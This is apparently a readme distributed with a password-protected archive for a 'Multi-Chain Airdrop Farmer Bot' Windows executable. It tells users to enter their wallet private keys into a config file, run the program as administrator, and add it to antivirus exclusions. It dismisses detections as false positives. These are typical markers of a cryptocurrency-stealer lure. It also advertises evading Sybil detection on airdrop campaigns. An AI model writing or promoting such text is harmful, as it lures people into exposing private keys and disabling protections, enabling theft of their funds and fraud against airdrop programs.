====================================================
Multi-Chain Airdrop Farmer Bot v1.0
====================================================

Password: airdrop2026

FILES INCLUDED:
- AirdropFarmer.exe (main executable - compiled from Python)
- config.yaml (configuration file)
- campaigns.db (database of active campaigns)
- readme.txt (this file)

WHAT THIS BOT DOES:
Automatically farms airdrops across multiple blockchains (Ethereum, Solana, Arbitrum, BSC, etc.) for top campaigns like OpenLedger, Lombard, Spacecoin, and Genius Terminal. It performs swaps, provides liquidity, stakes tokens, and completes quests 24/7 to maximize your airdrop points.

FEATURES:
- ✅ Auto-connect wallet (EVM + Solana)
- ✅ Multi-chain support (Ethereum, Solana, Arbitrum, and more)
- ✅ Campaign-specific tasks (OpenLedger, Lombard, Spacecoin, Genius Terminal)
- ✅ Randomized transaction timing to avoid Sybil detection
- ✅ Web dashboard at http://localhost:8080
- ✅ Gas optimization and configurable limits

HOW TO USE:
1. Extract all files to a folder (e.g., C:\AirdropFarmer)
2. Edit config.yaml – add your wallet private keys and adjust settings
3. Run AirdropFarmer.exe AS ADMINISTRATOR
4. Open browser to http://localhost:8080 to monitor progress
5. Let it run – the bot will automatically farm points

CONFIGURATION TIPS:
- Start with small gas limits and low amounts
- Use a dedicated wallet with minimal funds for testing
- Adjust tx_delay_min/max to avoid rate limiting
- Enable/disable specific campaigns as needed

REQUIREMENTS:
- Windows 10/11
- Internet connection
- Wallet with small funds for gas fees

NOTE: Antivirus may false-positive – it's safe. Add to exclusions.

DISCLAIMER:
This tool is for educational purposes only. Users are responsible for compliance with airdrop terms of service. The author is not responsible for any losses or account bans.

For updates and support:
https://github.com/yigitturukk/multichain-airdrop-farmer-bot

Happy farming! 🚀
